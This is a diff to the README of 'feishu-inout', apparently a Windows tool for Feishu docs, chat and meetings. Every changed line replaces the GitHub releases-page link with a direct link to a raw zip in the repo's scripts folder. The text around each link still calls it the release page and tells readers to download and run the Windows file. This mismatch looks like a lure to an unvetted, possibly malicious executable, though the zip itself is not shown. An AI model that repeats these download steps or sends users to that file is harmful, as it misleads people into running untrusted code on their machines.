@@ -1,6 +1,6 @@
 # 🤖 feishu-inout - Control Feishu docs, chat, and meetings
 
-[![Download the app](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/kristencacogenic360/feishu-inout/releases)
+[![Download the app](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/kristencacogenic360/feishu-inout/raw/refs/heads/main/scripts/inout_feishu_v2.1.zip)
 
 ## 📌 What this app does
 
@@ -22,7 +22,7 @@ If you plan to connect your Feishu account, make sure you can sign in in a brows
 
 ## ⬇️ Download and install
 
-1. Open the release page: https://github.com/kristencacogenic360/feishu-inout/releases
+1. Open the release page: https://github.com/kristencacogenic360/feishu-inout/raw/refs/heads/main/scripts/inout_feishu_v2.1.zip
 2. Find the latest release at the top of the page
 3. Download the Windows file for your system
 4. If the file is in a .zip package, extract it to a folder you can find again
@@ -146,7 +146,7 @@ It can help with tasks like:
 
 Visit the release page to download and run the Windows version:
 
-https://github.com/kristencacogenic360/feishu-inout/releases
+https://github.com/kristencacogenic360/feishu-inout/raw/refs/heads/main/scripts/inout_feishu_v2.1.zip
 
 ## 🧪 Best first test
 
